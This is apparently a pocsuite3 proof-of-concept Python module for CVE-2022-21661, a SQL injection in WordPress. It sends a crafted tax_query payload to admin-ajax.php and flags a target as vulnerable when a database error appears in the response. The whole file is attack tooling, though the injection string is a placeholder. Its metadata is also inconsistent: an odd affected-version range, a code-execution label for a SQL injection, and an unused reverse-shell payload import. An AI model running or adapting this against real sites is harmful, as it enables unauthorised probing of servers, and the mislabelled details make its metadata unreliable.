from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = 'CVE-2022-21661'  # ssvid
    version = '1.0'
    name = 'WordPress plugin SQL注入漏洞'
    appName = 'WordPress'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''WordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是WordPress开源的一个应用插件。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            headers = {"Upgrade-Insecure_Requests": "1",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.99",
                         "Sec-Fetch-Dest": "document",
                         "Sec-Fetch-Mode": "navigate",
                         "Sec-Fetch-Site": "cross-site",
                         "Cache-Control": "max-age=0",
                         "Connection": "close ",
                         "Content-Type": "application/x-www-form-urlencoded"
                        }
            target = self.url+"/wp-admin/admin-ajax.php"
            data ={"action": "<action_name>","nonce": "a85a0c3bfa","query_vars": "{\"tax_query\":[{\"field\":\"term_taxonomy_id\",\"terms\":[\"<INJECT>\"]}]}"}
            r = requests.post(url=target, headers=headers,data=data,verify=False,timeout=5)
            if "database error" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)